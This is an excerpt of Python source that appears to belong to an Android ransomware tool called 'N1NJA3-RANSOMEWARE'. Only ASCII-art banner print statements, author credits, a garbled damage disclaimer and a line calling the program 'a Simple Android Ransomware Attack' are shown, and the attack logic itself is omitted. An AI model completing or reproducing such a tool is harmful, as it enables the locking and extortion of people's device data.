...
def banner():
    ...
    print(w+d+"      ((("+w+b+"@@@@@@@@@@@@@@@@"+w+d+")))    "+w+b+"N1NJA3-RANSOMEWARE- version 1.0")
    print(w+b+"      \@@/"+r+",:::,"+w+b+"\/"+r+",:::,"+w+b+"\@@       "+w+"------------------")
    print(w+b+"     /@@@|"+r+":::::"+w+b+"||"+r+":::::"+w+b+"|@@@\\     "+w+"Author by "+y+"@ZeroxUchiha")
    print(w+b+"    / @@@\\"+r+"':::'"+w+b+"/\\"+r+"':::'"+w+b+"/@@@ \\    "+w+"THIS RANSOMEWARE MAKE BY TEAM BD CYBER NINJA SPY AGENTS")
    print(w+b+"   /  /@@@@@@@//\\\@@@@@@@\  \\   "+w+"for any issues or damage and dont Drecrypt This all files on Android DEvice")
    print(w+b+"  (  /  '@@@@@====@@@@@'  \  )  "+w+"caused by this is Virus and data-lock Type's program")
    print(w+b+"   \(     /          \     )/")
    print(w+b+"     \   (            )   /")
    print(w+b+"          \          /"+w)
...
def start():
    ...
    print(f"""
    {r}N1NJA3{w} is a Simple Android Ransomware Attack
